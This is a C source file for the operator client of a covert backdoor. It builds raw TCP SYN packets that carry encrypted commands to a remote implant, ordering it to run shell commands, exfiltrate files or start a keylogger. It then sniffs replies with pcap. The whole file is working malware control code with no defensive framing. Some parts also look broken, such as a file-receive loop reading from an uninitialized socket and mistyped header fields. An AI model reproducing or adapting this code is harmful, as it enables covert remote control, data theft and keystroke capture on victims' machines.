#include "client.h"

// Local prototypes
static int parseConfiguration(const char filePath[], netInfo *info);
static int getUserInput(char *commandData, int command);
static void executeSystemCall(netInfo *info, char *commandData);
static void findFile(netInfo *info, char *commandData);
static void keylogger(netInfo *info);
static void sendCommand(netInfo *info, int command, char *commandData);
static char *getData(char *data, int length);
void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
static void listenForResponse(netInfo *info);

int main (int argc, char **argv)
{
    int option = 0;
    int command = -1;
    char configFile[PATH_MAX] = {"../settings.conf"};
    char commandData[PATH_MAX];
    char *temp = NULL;
    netInfo info;
    
    // Change the UID/GID to 0 (raise to root)
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }
    
    // Process the command line arguments
    while ((option = getopt (argc, argv, "f:c:")) != -1)
    {
        switch (option)
        {
            case 'f':
                snprintf(configFile, sizeof(configFile), "%s", optarg);
                break;
                
            case 'c':
                command = strtol(optarg, &temp, 10);
                break;
                
            default:
            case '?':
                fprintf(stderr, "Usage: %s -f [config file] -c [command type]", argv[0]);
                return 1;
        }   
    }
    
    // Read the configuration file
    parseConfiguration(configFile, &info);
    
    // If the command requires user input, obtain it
    if ((command == EXECUTE_SYSTEM_CALL) || (command == FIND_FILE))
    {
        if (!getUserInput(commandData, command))
            systemFatal("Unable to get user input");
    }

    // Determine the next function to call based on the command
    switch (command)
    {
        case EXECUTE_SYSTEM_CALL:
            executeSystemCall(&info, commandData);
            break;
            
        case FIND_FILE:
            findFile(&info, commandData);
            break;

        case KEYLOGGER:
            keylogger(&info);
            break;
        default:
            systemFatal("Unknown or missing command, check README for usage");
    }
    
    return 0;
}

static void executeSystemCall(netInfo *info, char *commandData)
{   
    // Send the command to the backdoor
    sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
    
    // Wait for the response from the backdoor
    listenForResponse(info);
}

static void findFile(netInfo *info, char *commandData)
{
    int backdoorSocket = 0;
    int bytesRead = 0;
    char buffer[PATH_MAX];
    FILE *file = NULL;
    
    // Create the file for saving data
    if ((file = fopen(commandData, "w+")) == NULL)
    {
        systemFatal("Unable to create a file");
    }
    
    // Send the command to the backdoor
    sendCommand(info, FIND_FILE, commandData);
    
    // Wait for the response from the backdoor
    listenForResponse(info);
    
    // Receive the data and write it to the file
    while ((bytesRead = recv(backdoorSocket, buffer, PATH_MAX, 0)) > 0)
    {
        fwrite(buffer, sizeof(char), bytesRead, file);
    }
    
    // Close the file
    fclose(file);
}

static void keylogger(netInfo *info)
{
    // Send the command to the backdoor
    sendCommand(info, KEYLOGGER, NULL);
    
    // Wait for the response from the backdoor
    listenForResponse(info);
}

static void listenForResponse(netInfo *info)
{
    char errorBuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
    pcap_t *handle;
    pcap_if_t *nics;
    pcap_if_t *nic;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    
    // Get the devices on the machine
    if (pcap_findalldevs(&nics, errorBuffer) == -1)
    {
        systemFatal("Unable to retrieve device list");
    }
    
    // Find a suitable nic from the device list
    for (nic = nics; nic; nic = nic->next)
    {
        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
        {
            break;
        }
    }
    
    // Open the session
    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
    if (handle == NULL)
    {
        systemFatal("Unable to open live capture");
    }
    
    // Create and parse the filter to the capture
    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", DEST_IP, SOURCE_PORT_STRING);
    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
    {
        systemFatal("Unable to compile filter");
    }
    
    // Set the filter on the listening device
    if (pcap_setfilter(handle, &fp) == -1)
    {
        systemFatal("Unable to set filter");
    }
    
    // Call pcap_loop and process packets as they are received
    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
    {
        systemFatal("Error in pcap_loop");
    }
    
    // Clean up
    free(filter);
    pcap_freecode(&fp);
    pcap_close(handle);
}

void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct ip *iph = NULL;
    char *data = NULL;
    char *payload = NULL;
    int ipHeaderSize = 0;
    unsigned short payloadSize = 0;

    // Get the IP header and offset value
    iph = (struct ip*)(packet + SIZE_ETHERNET);
#ifdef _IP_VHL
    ipHeaderSize = IP_VHL_HL(iph->ip_vhl) * 4;
#else
    ipHeaderSize = iph->ip_hl * 4;
#endif
    
    if (ipHeaderSize < 20)
    {
        return;
    }
    
    // Ensure that we are dealing with one of our sneaky TCP packets
#if defined __APPLE__ || defined __USE_BSD
    if (iph->ip_p == IPPROTO_TCP)
#else
    if (iph->protocol == IPPROTO_TCP)
#endif
    {   
        // Get the data and display it
        payload = malloc(sizeof(unsigned long));
        memcpy(payload, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(unsigned long));
        data = getData(payload, sizeof(unsigned long));
        printf("%.4s", data);
    }
#if defined __APPLE__ || defined __USE_BSD
    else if (iph->ip_p == IPPROTO_UDP)
#else
    else if (iph->protocol == IPPROTO_UDP)
#endif
    {        
        // Get the size of the payload
        memcpy(&payloadSize, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(unsigned short));
        payloadSize = ntohs(payloadSize);
        payloadSize = payloadSize - sizeof(struct udphdr);
        
        // Get the payload
        payload = malloc(sizeof(char) * payloadSize);
        memcpy(payload, (packet + SIZE_ETHERNET + ipHeaderSize + sizeof(struct udphdr)), payloadSize);
        
        // Get the data and display it
        data = getData(payload, payloadSize);
        printf("%s\n", data);
    }
    free(payload);
}

static char *getData(char *data, int length)
{
    char *decryptedData = NULL;
    char date[11];
    struct tm *tm;
    time_t t;
    
    // Get the date information
    time(&t);
    tm = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", tm);
    
    // Decrypt our command using today's date
    decryptedData = encrypt_data(data, date, length);
    
    return decryptedData;
}

static void sendCommand(netInfo *info, int command, char *commandData)
{
    char *buffer = NULL;
    char date[11];
    char *commandBuffer = NULL;
    char *passphrase = NULL;
    char *encryptedField = NULL;
    int sock = 0;
    int one = 1;
    int packetLength = 0;
    int length = 0;
    const int *val = &one;
    struct ip *iph = NULL;
    struct tcphdr *tcph = NULL;
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct tm *timeStruct;
    time_t t;

    // Create the packet buffer and get the total length of the packet
    if (commandData != NULL)
    {
        // Get the length of the command
        packetLength = strnlen(commandData, PATH_MAX);
        // Allocate the buffer for the packet, plus 2 for command and 1 for NULL
        buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr) + packetLength + 3);
        // Allocate the command buffer, add 3 for the command plus NULL
        commandBuffer = malloc(sizeof(char) * (packetLength + 3));
    }
    else
    {
        // Allocate the buffer for the packet, plus 2 for command and 1 for NULL
        buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr) + 3);
        // Allocate the command buffer plus 1 for the NULL
        commandBuffer = malloc(sizeof(char) * 3);
    }
    
    // Finish computing the total header length and assign buffer to headers
    // Add 2 for the command and 1 for the NULL
    packetLength += sizeof(struct ip) + sizeof(struct tcphdr) + 3;
    iph = (struct ip *) buffer;
    tcph = (struct tcphdr *) (buffer + sizeof(struct ip));

    // Get the time and create the secret code
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    passphrase = strdup(PASSPHRASE);
    encryptedField = encrypt_data(passphrase, date, 4);
    
    // Fill out the addess structs
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(info->srcPort);
    din.sin_port = htons(info->destPort);
    sin.sin_addr.s_addr = inet_addr((info->srcHost));
    din.sin_addr.s_addr = inet_addr((info->destHost));
    
    // Zero out the buffer
    memset(buffer, 0, packetLength);
    
    // IP structure
#if defined __APPLE__ || defined __USE_BSD
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = packetLength;
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;
    iph->ip_sum = 0;
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = packetLength;
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = sin.sin_addr;
    iph->daddr = din.sin_addr;
#endif
    
    // TCP structure
#if defined __APPLE__ || defined __FAVOR_BSD
    tcph->th_sport = htons(*info->srcPort);
    tcph->th_dport = htons(*info->destPort);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;
    tcph->th_urp = 0;
#else
    tcph->source = htons(SOURCE_PORT_INT);
    tcph->dest = htons(SOURCE_PORT_INT);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(32767);
    tcph->check = 0;
    tcph->urg_ptr = 0;
#endif
    
    // Build the command
    commandBuffer[0] = command + 48;
    commandBuffer[1] = '|';
    commandBuffer[2] = '\0';

    // If we have command data, combine it with the command code
    if (commandData != NULL)
    {
        strncat(commandBuffer, commandData, PATH_MAX + 2);
    }
    
    // Encrypt and copy the command into the packet
    length = strnlen(commandBuffer, PATH_MAX) + 1;
    encryptedField = encrypt_data(commandBuffer, date, length);
    memcpy(buffer + sizeof(struct ip) + sizeof(struct tcphdr), encryptedField, length);
    
    // IP checksum calculation
#if defined __APPLE__ || defined __USE_BSD
    iph->ip_sum = csum((unsigned short *)buffer, 5);
#else
    iph->check = csum((unsigned short *)buffer, 5);
#endif
    
    // Create the socket for sending the packets
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        systemFatal("Error creating raw socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        systemFatal("setsocketopt failed");
    }
    
    // Send the packet out
    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &din, sizeof(din)) < 0)
    {
        systemFatal("sendto failed");
    }
    
    // Cleanup
    if (close(sock) == -1)
    {
        systemFatal("Unable to close the raw socket");
    }
    
    free(buffer);
    free(commandBuffer);
}

static int getUserInput(char *commandData, int command)
{
    char *temp = NULL;
    
    // Prompt the user for the correct input
    if (command == EXECUTE_SYSTEM_CALL)
        printf("Enter command, max %d characters\n", PATH_MAX);
    else
        printf("Enter file name, max %d characters\n", PATH_MAX);
    
    // Obtain the entry
    if (fgets(commandData, PATH_MAX, stdin) != NULL)
    {
        // Remove the newline character if it exists
        if ((temp = strchr(commandData, '\n')) != NULL)
            *temp = '\0';
    }
    else
        return 0;
    return 1;
}

static int parseConfiguration(const char filePath[], netInfo *info)
{
    char line[PATH_MAX];
    int gotDestination = 0;
    FILE *file = NULL;
    
    // Open the configuration file
    if ((file = fopen(filePath, "r")) == NULL)
    {
        systemFatal("Unable to open the configuration file");
    }
    
    // While there are rule lines in the file
    while (fgets(line, sizeof(line), file))
    {
        // Skip commented lines
        if (line[0] == '#')
            continue;
        
        // Check to see if we have the first line, which should be destination
        if (gotDestination == 0)
        {
            if (sscanf(line, "%[^,],%d", info->destHost, &info->destPort) == 2)
            {
                gotDestination = 1;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
        else
        {
            // Must be the second line
            if (sscanf(line, "%[^,],%d", info->srcHost, &info->srcPort) == 2)
            {
                // We have the second line, so get out
                break;
            }
            else
            {
                systemFatal("Invalid configuration file");
            }
        }
    }
    fclose(file);
    return 1;
}
